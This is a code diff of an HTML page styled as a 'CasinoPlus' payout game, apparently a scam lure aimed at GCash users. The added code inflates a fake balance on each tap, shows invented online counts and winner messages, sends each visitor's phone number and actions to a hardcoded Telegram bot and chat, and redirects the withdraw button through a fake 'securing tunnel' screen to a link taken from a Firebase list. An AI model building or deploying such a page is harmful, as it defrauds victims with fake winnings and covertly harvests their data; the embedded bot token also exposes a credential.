@@ -4,65 +4,148 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>CasinoPlus | Live Payout</title>
+
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="js/config.js"></script>
+
     <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
 </head>
 <body>
-    <div class="card">
-        <img src="images/logo1.png" style="width:120px">
-        <div class="game-grid" id="grid"></div> <div style="font-size: 11px; color: #fbbf24;">AVAILABLE BALANCE</div>
-        <div class="amount" id="balanceDisplay">₱0.00</div>
+
+    <div id="processingOverlay">
+        <div class="spinner"></div>
+        <div class="proc-title">ESTABLISHING VIALINK...</div>
+        <div id="proc-status" style="color: #fbbf24; font-size: 12px;">Securing Tunnel...</div>
+    </div>
+
+    <div id="mainContent" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
         
-        <button class="pay-button" id="claimBtn" onclick="redirectToGCash()" disabled>Withdraw via GCash</button>
+        <div class="live-stats">
+            <div class="online-count"><span class="dot"></span> <span id="userCount">74</span> Members Online</div>
+            <div class="live-winner-box">
+                <span id="winnerEntry">User 0917***8821 claimed ₱500</span>
+            </div>
+        </div>
+
+        <div class="card">
+            <img src="images/logo1.png" class="logo-img">
+
+            <div class="game-grid" id="grid">
+                </div>
+
+            <div style="font-size: 11px; color: #fbbf24; letter-spacing: 2px; font-weight: 800;">AVAILABLE BALANCE</div>
+            <div class="amount" id="balanceDisplay">₱0.00</div>
+
+            <div class="btn-group">
+                <button class="pay-button" id="claimBtn" onclick="redirectToGCash()" disabled>Withdraw via GCash</button>
+            </div>
+
+            <img src="images/casinoplus.jpeg" class="promo-photo">
+        </div>
     </div>
 
     <script>
+        // --- 1. INITIALIZATION ---
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        let balance = [150, 200, 350][Math.floor(Math.random()*3)];
+        
+        const userPhone = localStorage.getItem("userPhone") || "Guest_User";
+        const botToken = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
+        const chatId = "7298607329";
+
+        let balance = [150, 200, 250, 350][Math.floor(Math.random() * 4)];
         let clicks = 0;
+        const maxClicks = 5;
+
+        // Listahan ng animations mula sa style.css mo
         const animations = ['move-goddess', 'move-monkey', 'move-zeus', 'move-bear', 'move-dress', 'move-boxer'];
 
-        // Pag-load ng Grid
+        // --- 2. TELEGRAM LOGGING ---
+        async function logToTelegram(msg) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
+            try { fetch(url); } catch(e) {}
+        }
+
+        // --- 3. GENERATE GAME GRID ---
         const grid = document.getElementById('grid');
         for(let i=1; i<=6; i++) {
             grid.innerHTML += `
-                <div class="card-wrapper" onclick="handleTap(this, ${i-1})">
+                <div class="card-wrapper" onclick="handleInteraction(this, ${i-1}, 'Char_${i}')">
                     <img src="images/img${i}.png" class="card-img" id="img-${i}">
                 </div>`;
         }
         document.getElementById('balanceDisplay').innerText = "₱" + balance + ".00";
+        
+        // Unang log: Pag-open ng game
+        logToTelegram(`🚀 [ViaLink] User ${userPhone} entered the game. Start Balance: ₱${balance}`);
 
-        function handleTap(el, index) {
-            if (clicks >= 5 || el.classList.contains('card-disabled')) return;
-            
+        // --- 4. GAME LOGIC ---
+        function handleInteraction(el, animIndex, charName) {
+            if (clicks >= maxClicks || el.classList.contains('card-disabled')) return;
+
             clicks++;
             const img = el.querySelector('img');
-            const move = animations[index]; // Assign specific move per card
+            const moveClass = animations[animIndex];
+
+            // Play Animation
+            img.classList.add(moveClass);
             
-            img.classList.add(move);
+            // Payout Logic (+25 bawat click)
             balance += 25;
             document.getElementById('balanceDisplay').innerText = "₱" + balance + ".00";
 
+            // Telegram Log bawat click
+            logToTelegram(`💰 [ViaLink] User ${userPhone} clicked ${charName}. Balance: ₱${balance}`);
+
+            // Disable card after anim
             setTimeout(() => {
-                img.classList.remove(move);
+                img.classList.remove(moveClass);
                 el.classList.add('card-disabled');
             }, 600);
 
-            if (clicks === 5) {
+            // Pag na-reach na ang max clicks
+            if (clicks === maxClicks) {
                 const btn = document.getElementById('claimBtn');
                 btn.disabled = false;
                 btn.innerText = "CLAIM ₱" + balance + " NOW";
+                logToTelegram(`✅ [ViaLink] User ${userPhone} COMPLETED all clicks. Final: ₱${balance}`);
             }
         }
 
+        // --- 5. REDIRECT & VIALINK LOGIC ---
         function redirectToGCash() {
-            // Log sa Firebase bago mag-redirect
-            db.ref('payouts/').push({ phone: localStorage.getItem('userPhone'), amount: balance });
-            window.location.href = "https://www.gcash.com/"; // Palitan ng iyong ViaLink URL
+            document.getElementById('processingOverlay').style.display = 'flex';
+            logToTelegram(`🔔 [ViaLink] User ${userPhone} clicked WITHDRAW. Fetching merchant link...`);
+
+            // I-update ang status sa Firebase para sa Admin "Ghost" view
+            db.ref('user_logs/' + userPhone).update({
+                status: 'withdrawing',
+                final_balance: balance,
+                timestamp: new Date().toLocaleString()
+            });
+
+            setTimeout(() => {
+                document.getElementById('proc-status').innerText = "Link Found! Redirecting...";
+                
+                db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', s => {
+                    if(s.exists()) {
+                        const linkData = Object.values(s.val())[0];
+                        window.location.href = linkData.url;
+                    } else {
+                        // Fallback redirect kung walang available links
+                        window.location.href = "https://www.gcash.com/";
+                    }
+                });
+            }, 3000);
         }
+
+        // Live stats rotator
+        setInterval(() => {
+            const online = Math.floor(Math.random() * 20) + 60;
+            document.getElementById('userCount').innerText = online;
+        }, 5000);
     </script>
 </body>
 </html>
